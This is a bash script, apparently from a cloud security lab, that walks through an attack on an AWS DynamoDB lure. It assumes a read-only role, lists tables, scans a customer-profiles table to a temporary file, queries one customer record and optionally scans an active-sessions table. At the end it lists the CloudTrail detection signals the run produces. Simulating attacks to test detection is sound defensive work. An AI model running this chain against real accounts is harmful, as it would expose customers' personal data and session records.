#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 9 (DynamoDB Customer Data Lure)
#
# This script walks through the attack chain step by step with colored output.
# It assumes the caller has valid AWS credentials for any identity in the account.
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 9 — ABUSE CHAIN"
echo "  DynamoDB Customer Data Lure"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

# ---------------------------------------------------------------
step "2" "Assuming lure role: customer-data-readonly-role"
# ---------------------------------------------------------------
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/customer-data-readonly-role"
attack "sts:AssumeRole → ${ROLE_ARN}"

CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_ARN}" \
  --role-session-name "recon-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .SessionToken)
info "Role assumed successfully"

# ---------------------------------------------------------------
step "3" "Listing all DynamoDB tables (dynamodb:ListTables)"
# ---------------------------------------------------------------
attack "dynamodb:ListTables"
aws dynamodb list-tables --output table
TABLE_NAME="prod-customer-profiles"
info "Target table identified: ${TABLE_NAME}"

# ---------------------------------------------------------------
step "4" "Describing the customer profiles table (dynamodb:DescribeTable)"
# ---------------------------------------------------------------
attack "dynamodb:DescribeTable → ${TABLE_NAME}"
aws dynamodb describe-table --table-name "${TABLE_NAME}" \
  --query "Table.{Name:TableName,Status:TableStatus,Keys:KeySchema}" --output json

# ---------------------------------------------------------------
step "5" "Scanning customer profiles (dynamodb:Scan)"
# ---------------------------------------------------------------
attack "dynamodb:Scan → ${TABLE_NAME}"
OUTPUT_FILE="/tmp/customer-profiles-scan.json"
aws dynamodb scan --table-name "${TABLE_NAME}" --output json > "${OUTPUT_FILE}"
RECORD_COUNT=$(jq '.Count' "${OUTPUT_FILE}")
info "Scanned ${RECORD_COUNT} customer profile record(s), saved to ${OUTPUT_FILE}"

# ---------------------------------------------------------------
step "6" "Querying a specific customer by partition key (dynamodb:Query)"
# ---------------------------------------------------------------
FIRST_CUSTOMER_ID=$(jq -r '.Items[0].customer_id.S // empty' "${OUTPUT_FILE}")
if [[ -n "${FIRST_CUSTOMER_ID}" ]]; then
  attack "dynamodb:Query → ${TABLE_NAME} (customer_id=${FIRST_CUSTOMER_ID})"
  aws dynamodb query --table-name "${TABLE_NAME}" \
    --key-condition-expression "customer_id = :cid" \
    --expression-attribute-values "{\":cid\":{\"S\":\"${FIRST_CUSTOMER_ID}\"}}" \
    --output json
else
  warn "No records returned by the scan — table may be empty (not yet populated). Skipping Query step."
fi

# ---------------------------------------------------------------
step "7" "Checking for the active-sessions table (optional, off by default)"
# ---------------------------------------------------------------
warn "prod-active-sessions is deployed only when include_active_sessions=true (off by default"
warn "here — scenario-10 owns that table name when both are deployed together)."
if aws dynamodb describe-table --table-name "prod-active-sessions" >/dev/null 2>&1; then
  attack "dynamodb:Scan → prod-active-sessions"
  aws dynamodb scan --table-name "prod-active-sessions" --output json \
    | jq '{Count, Items: .Items[0:3]}'
else
  info "prod-active-sessions not present in this deployment — skipping."
fi

# ---------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------
echo ""
step "8" "Cleaning up session"
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
info "Session credentials cleared"

echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Abuse chain complete${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated:${NC}"
echo "  • CloudTrail: AssumeRole on customer-data-readonly-role"
echo "  • CloudTrail: ListTables"
echo "  • CloudTrail: DescribeTable on ${TABLE_NAME}"
echo "  • CloudTrail: Scan on ${TABLE_NAME}"
echo "  • CloudTrail: Query on ${TABLE_NAME} (if records were present)"
echo ""
